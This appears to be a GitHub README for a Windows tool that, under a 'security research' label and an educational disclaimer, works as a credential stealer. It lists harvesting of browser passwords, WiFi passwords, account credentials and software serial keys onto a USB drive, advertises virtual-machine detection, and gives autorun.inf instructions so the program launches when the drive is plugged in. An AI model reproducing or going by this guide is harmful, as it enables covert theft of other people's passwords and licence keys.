# Security Research Toolkit 🔒

 ## ⚠️ Security warning
This project is for educational purposes and security research only.  
**Illegal use** under any circumstance.


## Features
- System data collects safely
- AES-256 data encryption
- Detection of virtual environments

## What does he do
- It extracts accreditation data and users' names from the device.
- Passwords are extracted from browsers installed on the device, and WiFi passwords.
- It extracts the serial keys for the applications installed on the device.
- The data is extracted and copied automatically in text files on the USB flash.


## Requirements
- .NET 9.0+
- System Windows

## Installation
```bash
git clone https://github.com/Mr-muhammed/Security-Research-Toolkit.git
cd SecurityToolkit

## How to use

## 1. Create autorun.inf file
- Create a new text file.
- Add the following content:

```ini

[Autorun]
open=Security Research Toolkit.exe
icon=your_icon.ico


- Save the file as Autorun.inf.

## 2. Copy files to the USB
- Put each of:
- Autorun.inf file
- The app.
- Any custom icon (if you use icon option).

## 3. Note
- Old versions of Windows (like XP): This method will automatically work.
- Modern versions (Windows 7 and above): Autorun has been disabled for USB media for security reasons. You will just see Autoplay notification that is asking you to choose a manually.
- To make Autoplay indicate your application:
- You can adjust the application of the application in Autorun.inf using Label = Myapp.
- But the operation will continue to have a manual choice of the user.
